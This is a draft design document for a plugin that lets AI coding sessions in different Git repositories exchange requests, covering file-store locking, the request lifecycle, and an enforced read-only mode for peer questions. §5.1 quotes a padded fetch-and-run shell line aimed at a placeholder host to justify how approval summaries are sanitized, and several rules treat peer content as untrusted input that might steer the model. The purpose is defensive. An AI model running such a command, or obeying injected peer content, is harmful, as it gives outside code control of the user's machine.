# multirepo-working-agents — Architecture Proposal

Status: **draft for review**. No code exists yet.

A Gentle Shell (Pi) plugin that lets independent sessions, each working in its own
Git repository, collaborate through a named **multiagent team**.

## 1. Goals and non-goals

**Goals**

- 2..N sessions, each with its own orchestrator, repository, context, and local work.
- A session can ask a peer a question or request a change, and resume when the peer replies.
- Requests survive session restarts, compaction, and peers being offline.
- Each session presents its own questions and approvals to the human.
- Installable as a standalone Pi package; UI lives in the existing TUI.

**Non-goals**

- No browser UI, no coordination server, no network transport.
- No shared Git repository or parent-directory review. RDD stays per repository.
- No proof of integration: a peer reporting "completed" is not proof that frontend
  and backend work together or that anything is deployed.
- No dependency on gentle-pi internal modules.

## 2. Concepts

| Concept | Meaning |
|---|---|
| Team | Named, persistent group, e.g. `tienda-online`. Exists independently of open sessions. |
| Member | `alias` + canonical repository root, e.g. `backend` → `~/personal/tienda/backend-repo`. Identity is the repository, not the session. |
| Binding | A live session claiming a member role. Ephemeral; recreated when a session reopens in the member repo. |
| Request | A correlated unit of work from one member to another: a `question` or a `change`. |
| Event | An append-only record of a state transition or message on a request. |

Trust boundary: **joining a team is a human action in each session.** Only
members of the same team can exchange requests.

## 3. Storage layout

Root: `~/.pi/multiagent/` (directories `0700`, files `0600`, same OS user only).

```
~/.pi/multiagent/
  config.json                   # optional: { "readOnlyTools": [...], "pruneClosedAfterDays": 7 } (§3.1, §5.1); only read
  teams/
    <team-name>/           # the name is the ID; creation is atomic, so names are unique
      team.json            # name, description, createdAt
      .claim-<sha256>       # repository claim; member file remains the source of truth
      .lock-members         # serializes joins and leaves; released afterwards
      members/
        <alias>.json            # alias, repositoryRoot, joinedAt
      presence/
        <alias>.json            # sessionId, pid, state (active|idle), heartbeatAt, token
        .lock-<alias>           # short-lived lock around presence changes (pid, token)
      requests/
        <request-id>/
          request.json          # immutable: from, to, kind, title, body, dependsOn, createdAt
          events/
            <seq>.json          # append-only; 6-digit sequence, actor and role inside
          approvals/
            <approval-id>/      # ULID; one blocked tool call asking the human (§5.1)
              request.json      # approvalId, requestId, recipient, requester, toolName, summary, createdAt
              decision.json     # choice, decidedBy, at; created once with link(2): first answer wins
      cursors/
        <alias>.json            # per request: positions handled (creation = 1, then one per event)
```

Write rules:

- Every file or directory is built under a `.tmp-*` name and then moved into place,
  so readers never see partial content. Files are published with `link(2)`, which
  fails if the target exists; directories with `rename(2)`, which fails onto a
  non-empty target.
- Existing data temporarily moved out of sight uses `.hidden-*`; readers ignore all
  dot-prefixed entries. Cleanup quarantines abandoned build entries as `.trash-*`.
- Joins and leaves serialize under `.lock-members`; a join publishes a SHA-256
  repository claim with `link(2)` and a successful leave releases it. Member files
  remain authoritative, including for teams created before claims existed; an
  orphaned claim from an interrupted join can be replaced under the lock.
- `request.json` is never rewritten. State is derived by replaying `events/`.
- Event files are named only by sequence number, so concurrent writers compete for
  the same name. The loser re-reads the events, re-validates its transition against
  the new state, and retries with the next number.
- Presence ownership is proven by a random per-claim `token` held in memory by the
  claiming process, not by `sessionId`: two processes opening the same Pi session
  (for example `pi --continue` in two terminals) cannot both bind one member.
- Known limitations:
  - delivery deduplication uses the current Pi session's recorded history and an
    in-process set for queued messages. Deduplication is per Pi session: another
    session bound to the same member cannot consult the original session's history;
    if the cursor was not saved before a crash, delivery there can repeat. A crash
    after cursor save but before a queued message is appended to Pi history can lose
    that message. This loss window also existed before delivery IDs: the cursor was
    saved after queueing, not after history append. This is not an atomic exactly-once
    protocol; old messages without delivery IDs
    cannot be deduplicated through history;
  - breaking a dead holder's presence lock has a narrow theoretical window when
    three sessions race; exclusive creation of the presence file still prevents
    two winners;
  - locks have no age expiry: a live or reused holder PID can cause bounded waits
    followed by `store-busy`; automatically breaking a live lock is unsafe;
  - `.hidden-*` leftovers from an interrupted hide are not automatically removed;
    they may contain existing data and require manual recovery. Temporary cleanup
    cannot stop a writer that already holds an open file or directory handle. Directory
    restoration reserves the old name with `mkdir`, but POSIX `rename` can replace
    an empty reservation: a concurrent non-cooperating renamer can race restoration.
- Each transition has exactly one allowed actor (see §4), so two sessions never
  compete for the same transition.
- A member is `offline` when its presence heartbeat is older than 15 s.
- Presence changes (claim, takeover, heartbeat, release) run under `.lock-<alias>`,
  created with `link(2)`. A lock whose holder process is dead is broken; a live one
  is waited for, then reported as `store-busy`. The presence file itself is created
  with `link(2)`; only its owner rewrites it (temp + `rename(2)`) or removes it.
- Only the session bound to a member writes that member's cursor (temp + `rename(2)`).
- An approval directory is built under a `.tmp-*` name and renamed into place;
  `decision.json` is published with `link(2)`, so concurrent answers from two
  terminals leave exactly one decision and the loser reads the winner's. A
  `decision.json` that cannot be read for any reason (invalid JSON, `EACCES`,
  `EISDIR`, ...) counts as `deny`; reading it never throws.
- A request directory only ever disappears as a whole (cleanup, §3.1, or the
  rollback of `createRequest`): it is renamed to a `.hidden-*` name first. A reader whose
  `events/` directory or event file vanishes while reading reports the request as
  `unknown-request` (skipped by listings), never as a partial request.

### 3.1 History cleanup

A closed request (`declined`, `cancelled`, `completed`, `failed`) whose last activity
(its last event's `at`, or `createdAt` without events) is older than
`pruneClosedAfterDays` days (`config.json`, default 7, a positive whole number;
invalid → 7 and one warning) is removed with its events and approvals, except when:

- an open request lists it in `dependsOn`; or
- a current party member has not received all of it yet (its cursor still has a
  pending delivery on it).

Removal is atomic per request: rename the request directory to `requests/.hidden-*`,
check again for an open dependent (and rename it back if one appeared), then delete
it. `createRequest` re-checks its dependencies after publishing and withdraws itself
if one vanished, so a new open request and the removal of its dependency never both
succeed. Terminal requests accept no events, so no writer competes with the removal.
When that re-check finds a missing dependency, it waits briefly and retries once before
withdrawing and reporting `unknown-dependency`. An unknown dependency still changes nothing.

Cursors keep a single writer: the remover drops the removed ids only from its own
bound member's cursor (inside its delivery queue), never from another member's, even
an offline one (that member could bind while the remover writes and lose progress).
Every other session drops ids of vanished requests from its own cursor, but only
once an id has stayed missing for 60 s (`MISSING_GRACE_MS`) across later passes:
cleanup hides a request for an instant and may rename it back, and dropping its
cursor entry in that instant would deliver everything on it again (S8). The time an
id was first seen missing is kept in memory per binding; an id that reappears keeps
its cursor entry and its missing time is forgotten.

- **Automatic**: when a session binds, old `.tmp-*` and `.trash-*` entries are
  isolated under a unique `.trash-*` name and rechecked before removal. Entries
  containing anything younger than one hour are retained and restored when possible;
  an occupied original name leaves them in trash (subject to the directory reservation
  race in Known limitations). Hidden stored data
  and locks are never selected. A `.tmp-*` entry is a candidate only when both its mtime
  and its ctime are more than one hour old, and never when it is a directory holding a
  `request.json`: sessions of the previous version still hide stored data under `.tmp-*`
  during an upgrade, and rename refreshes the moved entry's ctime (review R1-001). Cleanup errors do not prevent history pruning. It also removes its team's candidates and
  notifies `teams: removed N closed requests older than 7 days.` only when N > 0.
- **Manual**: `p` in `/teams` (§7).
- Implementation: `lib/prune.ts` (`pruneCandidates`, `removeRequests`, injectable `now`).

IDs: the team name is its ID. Request IDs are monotonic ULIDs (sortable,
collision-safe without coordination).

### 3.2 Migration from pi-workspaces

The package was first called `pi-workspaces` and stored teams as
`<root>/workspaces/<name>/workspace.json` with a `workspace` field in each
`request.json`. At `session_start`, before binding, `lib/migrate.ts` moves that data:

- Nothing happens when `<root>/workspaces` does not exist.
- Nothing is migrated while any heartbeat in the old tree is fresh (a session of the
  previous version may still write there); the human is told to close those sessions.
- Migrations serialize using a token-bearing `<root>/.lock-migrate` created with
  `link(2)`: dead holders are broken, live holders waited for up to 30 seconds, then
  an error asks for a retry. After acquiring it, the old tree is checked again.
- Every team is first copied into a hidden `.tmp-*` directory under `<root>/teams`
  (`workspace.json` becomes `team.json`; the top-level `workspace` field of every JSON
  file becomes `team`, other keys and their order unchanged; hidden entries are
  skipped). Only when the whole old tree copied cleanly is each team published with
  `rename(2)`, so a team is published at most once and an existing team is never
  overwritten. An existing team is already migrated only when its entire visible
  tree has the same relative paths and file bytes as the staged copy (including after
  a crash between publication and backup); otherwise it is reported as a conflict.
- Invalid JSON, a symlink, or any special file aborts the migration with an error:
  no team is published and the old tree is untouched.
- The old tree is never deleted: it is renamed to
  `<root>/workspaces.migrated-<timestamp>` and the human is told where.

## 4. Request lifecycle

```
              requester                 recipient
 requested ──cancel──▶ cancelled
     │
     ├──────────────── decline ───────▶ declined
     ▼
  accepted ──────────── start ────────▶ in_progress
                                          │   ▲
                                 ask-human│   │resume
                                          ▼   │
                                     needs_decision
                                          │
                          complete / fail ▼
                                 completed | failed
```

| Transition | Actor | Requires the human in that session |
|---|---|---|
| create (`requested`) | requester | yes for `change`; no for `question` |
| `cancel` | requester | no |
| `accept` / `decline` | recipient | **yes for `change`** |
| `start`, `ask-human`, `resume` | recipient | no |
| `complete` / `fail` | recipient | no |
| `comment` (no state change) | either | no |

`complete` carries a summary and optional evidence references (branch, commit, PR,
contract file path). It explicitly does not claim integration.

`needs_decision` means the recipient is blocked on **its own** human. The question
is asked in the recipient session; the requester only sees the state.

### Dependencies

- `dependsOn` lists request IDs that must complete before this request can be done.
- `dependsOn` is fixed at creation and may only reference existing requests of the
  same team, so the dependency graph cannot contain a cycle. No runtime cycle
  check is needed.
- A `question` has no accept step: from `requested` the recipient may `complete`
  (answer) or `decline` it.
- Per-member cursors and session-history delivery IDs suppress duplicate handoffs
  within their limits (§5).

## 5. Delivery and wakeup

Each session's plugin instance:

1. On `session_start`: resolve the Git root of `cwd`. If it matches a member of a
   team, ask the human whether to resume that role. Never bind silently; a
   session without UI (`ctx.hasUI` false) does not bind. Binding fails with
   `member-bound` (`Member "<alias>" is bound to another live session.`) while
   another session's heartbeat is fresh; an offline holder is taken over. Right after
   binding, the session withdraws (records `withdrawn`) its own undecided approvals a
   previous process of this member left behind, so the requester never shows a
   dialog nobody waits for, then runs the history cleanup (§3.1). The requester's
   side also closes such a dialog by itself when the recipient's presence goes
   stale (§5.1).
2. While bound: write a presence heartbeat every 5 s (state `active` between
   `agent_start` and `agent_end`, else `idle`); watch the team directory with
   `fs.watch` (recursive where supported; `presence/` and `cursors/` ignored), with a
   5 s polling fallback. Bursts are debounced into one pass; passes never overlap.
   A heartbeat that finds another session's record ends the binding.
3. On new events addressed to it (each delivery advances the persisted cursor only
   after it succeeded; a member's own events are never delivered):
   - Always update the status (`ctx.ui.setStatus`) after each pass.
   - **New incoming `change` request**: show a human prompt (`ctx.ui.select`):
     accept / decline / later. On accept the plugin appends `accept` as the
     recipient and then tells the model; on decline it appends `decline`. Later (or
     dismissing the prompt) keeps the request pending; it is offered again at the
     next bind, not again in the same binding. Nothing else about an undecided
     change reaches the model.
   - **The requester's side (S18)**: a change this session sent never opens a prompt
     here. Its human decided when sending it (§6: `Send` or `Send and accept on the
     recipient's behalf`) and may still accept or decline it from `/teams`
     (§7) while the recipient has not decided. Such a decision is appended as the
     **recipient's** event (the human decided), with the summary
     `Accepted on the recipient's behalf by the human in the requester session.` (or
     `Declined ...`). The decision *is* that event: event files are created with
     `link(2)`, so the first answer wins and the second fails with
     `transition-not-allowed`; a losing recipient prompt is told
     `teams: request <id> was already decided in another terminal (state "<state>"); nothing changed.`
     A pass that sees the request decided withdraws the recipient's open prompt (its
     `AbortSignal`) and notifies `teams: request <id> is now "<state>"; this prompt was withdrawn.`
     On accept on its behalf, the recipient's next pass tells its model once (the
     cursor advances past the accept), saying the human accepted from the
     requester's session. Dismissing any dialog counts as its refusal. That accept
     is not delivered back to the requester's own model as a reply (its human made
     it); the recipient's later events are.
   - **Incoming `question`**: inject it into the model without a human prompt, framed
     as a read-only request: the model may read and answer but must not edit files,
     run mutating commands, or commit. If answering needs a change, the model replies
     suggesting a `change` request instead. The widget still shows the question.
     Read-only is **enforced**, not just instructed (see §5.1).
   - **Reply to a request this session sent**: every event by the recipient
     (`accept`, `start`, `complete`, `fail`, `comment`, ...) is injected.
   - **Comment by the requester on a request this session received** (after its
     creation was delivered): injected.
4. Injection uses `pi.sendMessage` with `customType: "gentle-teams.peer"`, never
   `sendUserMessage`, so peer content cannot look like human input. Each message
   carries a stable delivery ID; the session checks its own Pi history and an
   in-process set before sending, and advances its cursor if already found. Pi
   history survives `/reload` and resuming the same session when the message was
   appended. Queued follow-up/steer messages may not yet be in history, so only
   the in-process set covers them until appended. Failed items back off from 1 s
   exponentially up to 60 s; other requests continue, while later events on the
   failed request wait to preserve ordering.
   - Always `triggerTurn: true`: an idle session starts a turn.
   - `deliverAs: "followUp"`, except replies on requests this session sent while it
     is busy, which use `deliverAs: "steer"`.
5. On `session_shutdown`: stop the heartbeat and watcher, and remove the presence
   file if it still belongs to this session. Pending requests stay on disk.

### 5.1 Read-only question mode

Peer content is untrusted, so an instruction alone is not enough to keep a
`question` read-only.

- Question mode starts when a `gentle-teams.peer` message with delivery
  `incoming-question` enters the conversation (`message_start`). Pi emits that event
  both when the message starts an idle run and when a queued `followUp` is consumed
  inside a busy run.
- A question ends when this session posts `complete` or `decline` on it with
  `multiagent_update` (a `comment` is not an answer; a rejected update changes
  nothing), or when Pi settles (`agent_settled`), whichever comes first. Not at
  `agent_end`: Pi may auto-retry, compact and retry, or continue after it, and the
  retried run gets no new `message_start` for the question already in context.
  Several questions may be active; the mode lasts until none is left. A new or shut
  down session starts outside the mode.
- While it is active, a `tool_call` hook lets an allowlist run without asking:
  `read`, `grep`, `find`, `ls`, the plugin's own four tools by exact name
  (`multiagent_status`, `multiagent_request`, `multiagent_inbox`, `multiagent_update`),
  and the configured read-only tools (D9): `readOnlyTools` in
  `~/.pi/multiagent/config.json`, default `mem_search`, `mem_context`,
  `mem_get_observation`, compared by exact name; a list replaces the defaults. A
  missing file gives the defaults; an invalid one gives the defaults and one warning
  at session start. `bash`, `edit`, and `write` are never allowlisted: listed there,
  they are dropped with the warning
  `teams: <path>: "readOnlyTools" cannot list bash, edit, or write; question mode keeps asking the human before they run.`
  (naming the ones listed). A third-party tool that merely starts with `multiagent_` is not
  allowlisted.
- **Ask instead of block (D7, D8).** Any other call (`bash`, `edit`, `write`,
  subagents, unknown tools) is held while the plugin asks the human, naming the
  oldest active question that is not lifted:
  1. it publishes `requests/<id>/approvals/<approval-id>/request.json` with a
     summary of what would run (the `bash` command, the `edit` / `write` path,
     otherwise the input as JSON): every Unicode format character (`\p{Cf}`: bidi
     controls, zero-width characters, U+00AD, U+061C, U+180E, U+2060-U+2064, tag
     characters, ...) removed; U+2028, U+2029 and other control characters as
     spaces; fences neutralized; whitespace runs collapsed; a run of the same
     character longer than 3 collapsed into `<char>×<count>`, so padding cannot push
     a command out of sight (`echo hello #×500; curl evil.sh | sh; #×500; echo done`).
     Up to 600 characters are kept; beyond that, the first 360, ` … `, and the last
     180, so a dangerous tail stays visible. The summary is cleaned again when shown;
  2. it shows `ctx.ui.select` in this session right away (one dialog at a time
     with the other plugin prompts), titled
     `<alias> wants to run <tool> while answering request <short id>` with the
     summary on the next lines (wrapped at 100 characters), and the choices `Allow once` /
     `Allow for the rest of this request` / `Deny`;
  3. the requester's session, when bound and live, sees the approval through its
     watcher and shows the same dialog (only while the recipient is live);
  4. the first answer creates `decision.json` with `link(2)`; the tool call
     resolves at once from its own dialog, or from the watcher / 5 s polling
     when the other terminal answered. The other dialog is withdrawn (its
     `AbortSignal`) with
     `teams: the approval for <tool> on request <short id> was answered in another terminal; this prompt was withdrawn.`
     A losing concurrent answer is told
     `teams: the approval for <tool> on request <short id> was already answered in another terminal; nothing changed.`
     When the recipient's call gave up instead (`withdrawn`, below), the requester's
     dialog closes with
     `teams: the approval for <tool> on request <short id> was withdrawn before anyone answered; this prompt was closed.`
     and an answer that lost to it is told
     `teams: the approval for <tool> on request <short id> was withdrawn before your answer; nothing changed.`
     The requester's side also withdraws an approval (records `withdrawn` and
     closes its dialog with the first of these notices) once the recipient's
     presence is stale: nobody is waiting for the answer any more, and a
     recipient that was only stalled sees its call withdrawn, never allowed.
- Choices: `Allow once` runs this call; the next blocked call asks again.
  `Allow for the rest of this request` lifts question mode for that request until
  its question ends (answer or `agent_settled`). `Deny`, or dismissing the dialog,
  blocks the call with
  `Denied by the human: this session is answering a read-only peer question (request <id>).`
- Without an approval prompt anywhere when the call starts (no UI here and the
  requester's session is not live, or this session is not bound) the call is
  blocked at once, nothing is written, and the reason is the S12 text followed by
  `No human could be asked to allow <tool>: neither this session nor the requester's session can show an approval prompt.`
  If the waiting call is aborted (Esc), the session unbinds, or (without a UI
  here) the requester's session goes offline, the plugin records `withdrawn` (it
  never allows anything) and blocks with the S12 text followed by
  `The approval request for <tool> was withdrawn before a human answered.`
  The S12 text lists the allowed tools, including the configured ones:
  `Blocked: this session is answering a read-only peer question (request <id>). Only read, grep, find, ls, multiagent_status, multiagent_request, multiagent_inbox, multiagent_update, mem_search, mem_context, and mem_get_observation are allowed until it is answered.`
- Only a plugin dialog answered by the human creates a decision. No agent tool
  reads or writes approvals, and the model of either session cannot answer one.
  All sessions run as the same OS user, so an agent allowed to run `bash` could
  still forge store files: the gate protects against peer content steering the
  model, not against a deliberately malicious local agent.
- Implementation: `lib/question-mode.ts` (pure state, `gateToolCall`, and a small
  event adapter), `lib/approvals.ts` (approval files), `lib/config.ts`, and
  `TeamSession.askApproval` in `lib/session.ts`, wired in
  `extensions/teams.ts`.
- `bash` is never allowlisted, because telling mutating from read-only shell
  commands is not reliable; the human sees the command and decides.
- Questions are delivered only when the session is idle or as a `followUp`, so the
  mode never applies to work already in progress.

Injected content is framed as **untrusted peer data** ("Request from member
`frontend` in team `tienda-online`: …"), with a size limit (8 KiB body).
A peer message never authorizes commits, pushes, reviews, or consent prompts.

## 6. Agent-facing tools

| Tool | Parameters | Purpose |
|---|---|---|
| `multiagent_status` | — | Team, own alias, members with presence (`active`, `idle`, `offline`), open requests sent and received. |
| `multiagent_request` | `to`, `kind`, `title`, `body`, `dependsOn?` | Create a `question` or `change` from the bound member. |
| `multiagent_inbox` | `state?` | List requests this member sent or received: id, kind, from, to, title, derived state. |
| `multiagent_update` | `requestId`, `transition`, `summary?`, `evidence?` | Append a transition or comment as the bound member. |

Implementation: `lib/tools.ts`, registered in `extensions/teams.ts` at load.
Parameters are plain JSON Schema objects (Pi validates tool arguments as JSON
Schema), so the package has no runtime dependency.

Tools fail closed. A failure is an error result (`isError: true`) whose text is
`<code>: <message>`, with `details.error = { code, message }`:

- `not-bound` for every tool while the session is not bound:
  `This session is not bound to a team member; bind it with /teams or at session start.`
- Store errors keep their code and message unchanged (`unknown-member`,
  `self-request`, `transition-not-allowed`, `not-a-party`, `unknown-request`,
  `unknown-dependency`, `body-too-large`, ...).
- `multiagent_request` with kind `change` first shows one dialog (S18,
  `ctx.ui.select`): `Send this change request to another team member?` with
  the team, recipient, title, and a one-line neutralized body preview (control,
  bidi, and zero-width characters removed), and the choices `Send` (the recipient
  decides when it sees it), `Send and accept on the recipient's behalf` (creates the
  request, then appends `accept` as the recipient, §5; the result has
  `state: "accepted"` and `acceptedOnBehalf: true`), and `Cancel`. `Cancel` or
  dismissing fails with `cancelled-by-human`, a session without UI fails with
  `human-confirmation-required`; both write nothing. A `question` needs no
  confirmation.
- `multiagent_update` never accepts or declines a `change`: those fail with
  `human-decision-required` and write nothing; the human decides through the §5
  prompt, the send dialog, or `/teams`.
- `multiagent_inbox` with an unknown `state` fails with `invalid-state`.

## 7. Human-facing UI: `/teams`

Modeled on `/gentle:profiles`: tabs per team, a highlighted "This session" row,
a members table, action buttons, and a keybinding footer.

While bound, Gentle Shell's Integrations rail displays ordered `setStatus` entries
`gentle-teams.1` (team and ★ self), `gentle-teams.2` (members sorted by alias with ● active,
◐ idle, ○ offline), and `gentle-teams.3` (approvals waiting, otherwise the most recent
open request involving this member). The third entry is omitted when neither exists.
Watcher passes and heartbeats refresh changed entries; unbinding and shutdown clear them.
The compact footer may omit trailing entries when space runs out.

```
 tienda-online ★ ▾    api-pagos ⊙    + New
──────────────────────────────────────────────────────────────
 tienda-online   Frontend + backend for the store.

 ▸ This session   backend    ~/personal/tienda/backend-repo   active
 ──────────────────────────────────────────────────────────────
  Member      Repository                         State     Requests
  frontend    ~/personal/tienda/frontend-repo    idle      1 waiting
› backend     ~/personal/tienda/backend-repo     active    1 in progress
  admin       ~/personal/tienda/admin-repo       offline   —

 [ Join ]  [ Leave ]  [ Requests ]
 ←→ team  ↑↓ member  j join  l leave  r requests  p prune  n new  esc close
```

- **Full screen (S19)**: the screen is a `ctx.ui.custom()` overlay as wide and tall
  as the terminal (`overlay: true`, `width: "100%"`, `maxHeight: "100%"`,
  `margin: 0`), and `render` gets the terminal height from `tui.terminal.rows` at
  each render. It returns exactly that many lines: the content and any feedback
  line, blank padding, then the footer on the last line. A member, request, or
  event list that does not fit shows a window around the selection with
  `↑ N more` / `↓ N more` lines. When rows are so few that no list row would fit,
  the blank lines, the description line, and the rule are dropped first. The
  members footer fits 80 columns.

- Tabs: `★` this session is bound to a member there; `⊙` another member is live;
  `▾` marks the selected tab. `›` marks the selected member.
- "This session" shows the bound member and its presence state; otherwise this
  repository's member with `not bound`, `not a member`, or `not in a Git repository`.
- **Requests** column: open requests the member *received*, grouped as `waiting`
  (`requested`), `in progress` (`accepted`, `in_progress`), and `needs decision`;
  `—` when there are none.
- With no teams, the screen explains what a team is and offers `n new`.
- Every line is cut to the terminal width; stored text (titles, summaries,
  descriptions) is shown on one line with control characters removed and peer
  fences neutralized.
- Without the TUI (`ctx.mode` other than `"tui"`, or no UI) the command reports
  `/teams requires interactive mode.` and changes nothing.

Actions (one at a time: the screen closes with the action, the dialog runs with
`ctx.ui.input` / `ctx.ui.confirm`, then the screen reopens at the same place with a
feedback line):

- `n` **New**: name, then optional description. Store errors are shown verbatim as
  `<code>: <message>` and nothing is written.
- `j` **Join** the selected team with this session's Git repository. Outside a
  Git repository: `teams: this session is not inside a Git repository; open it in a repository to join.`
  If the repository is already a member, that member is resumed without asking for
  an alias; otherwise the alias input proposes the repository folder name, lowercased
  and reduced to the alias pattern (empty answer = proposal). The session then binds
  to the member. If it is bound elsewhere, the human confirms the switch first (D4);
  refusing writes nothing. A member held by another live session is reported as
  `member-bound` and the current binding is kept.
- `l` **Leave** the selected member after confirmation, only when it is this
  session's own repository: another repository's member can be removed only from a
  session opened in that repository (each session decides for its own repository).
  D2 errors such as
  `open-requests` are shown verbatim and nothing changes. Leaving the member this
  session is bound to unbinds it.
- `r` **Requests**: every request of the team (short id, kind, from → to,
  one-line title, state). `enter` shows the event history (`↑↓` move through its events, `›` marks the
  selected one); `esc` goes back. A change
  addressed to this session's bound member that is still `requested` (including one
  postponed with "later") is marked `awaiting your decision` and can be decided with
  `a` / `d`: the same effects as the §5 prompt (the event is appended as the
  recipient; on accept the model is told and the cursor advances). A change this
  session's member **sent** that is still `requested` is marked
  `awaiting <recipient>, a/d on its behalf`; `a` / `d` append `accept` / `decline`
  as the recipient on its behalf (§5), and the recipient's session tells its model.
- `p` **Clean up** the selected team (§3.1): the candidates are counted first.
  With none, the feedback line says
  `No closed requests older than 7 days in "<ws>"; nothing to remove.` and nothing is
  asked. Otherwise `ctx.ui.confirm` asks
  `Remove N closed requests older than 7 days from "<ws>"?`; cancel removes nothing
  (`Clean-up cancelled; nothing changed.`), confirm removes those still eligible and
  reports `Removed N closed requests from "<ws>".`
- The session-start bind prompt (§5) labels members held by another live session,
  e.g. `tienda-online as backend (in use by another live session)`; they stay
  selectable (the claim fails with `member-bound`, or takes over if the holder went
  offline meanwhile).
- A session binds to **one team at a time**. A repository may be a member of
  several teams; the session chooses which one it acts in.
- A member has **at most one bound session**. A second session in the same
  repository sees the role as taken and may claim it only when the first is offline.
- The screen shows a snapshot taken when it opens; it refreshes after each action.

Implementation: `lib/ui/teams-screen.ts` (pure state, `render(state, width, theme, rows?)`,
`handleKey(state, key)`), `lib/ui/text.ts` (width helpers), `lib/teams-command.ts`
(command loop with injected ports), registered in `extensions/teams.ts`.

Notes (from gentle-pi 4.5.1 and Pi docs):

- `/gentle:profiles` is a hand-written component (`RoutingTablePanel`,
  `extensions/gentle-ai.ts:3300`) that implements `render(width)`, `handleInput(data)`,
  and `invalidate()`. It is opened with `ctx.ui.custom()` (`:4550`) and wrapped by
  gentle-pi's internal `createNativeFullscreenInteraction`
  (`lib/native-fullscreen-interaction.ts:43`). Mouse support uses its own hit regions.
- None of that is exported, so it cannot be imported. `/teams` follows the same
  pattern with public APIs only: `ctx.ui.custom()`, the injected `theme` and
  `keybindings`. `@earendil-works/pi-tui` is not a dependency, so the package keeps
  minimal width helpers (`visibleWidth`, `truncateToWidth`) and decodes keys itself,
  falling back to the injected keybindings for navigation.
- Version 1 is keyboard-only, with mouse support as a later improvement.

## 8. RDD and multi-repo

- Each session runs RDD only against its own repository root. The plugin never
  calls `gentle_review` and never passes a peer's repository as `workspaceRoot`.
- Starting Gentle Shell in a non-Git parent folder makes RDD resolve the parent as
  its root (`extensions/gentle-ai.ts:7781-7811` in gentle-pi 4.5.1). The plugin
  recommends opening one session per repository, and `/teams` warns when the
  session `cwd` is not inside a Git worktree.

## 9. Package layout

```
package.json          # "pi": { "extensions": ["extensions/teams.ts"] }, keyword pi-package
extensions/
  teams.ts            # wiring: tools, command, hooks
lib/
  store.ts            # filesystem layout, atomic writes, event append
  migrate.ts          # one-time migration from pi-workspaces (§3.2)
  team-status.ts      # Integrations entries in the Gentle Shell rail (§7)
  lifecycle.ts        # pure state machine and actor rules
  dependencies.ts     # wait-cycle detection
  delivery.ts         # watcher, cursors, injection policy
  ui/                 # /teams screens
tests/
docs/
```

`lifecycle.ts` and `dependencies.ts` are pure and fully unit-tested. `store.ts`
tests run against a temporary directory. Delivery is tested with a fake `pi` object.

## 10. Decisions

| # | Question | Decision |
|---|---|---|
| D1 | Does an incoming `question` need recipient-human approval? | No. The model answers read-only; `change` requests still need approval. |
| D2 | Leaving a team with open requests? | Blocked until they are resolved or cancelled. |
| D3 | Can two sessions bind the same member? | No. One session per member; takeover only when the holder is offline. |
| D4 | Can a session belong to several teams at once? | No. One team per session at a time. |
| D5 | Command name | `/teams` (first `/workspaces`; renamed by D12) |
| D12 | Rename "workspace" to "team" | The whole concept: command, package, types, text, and storage (migrated, §3.2). The root `~/.pi/multiagent` and the `multiagent_*` tool names stay. |

| D6 | Is read-only question answering enforced? | Yes, with a `tool_call` allowlist; `bash` is blocked during question mode (§5.1). |

## 11. Not yet verified

- The non-Git-parent RDD failure has not been reproduced.
- `fs.watch` reliability on macOS for this layout is assumed and covered by the polling fallback.
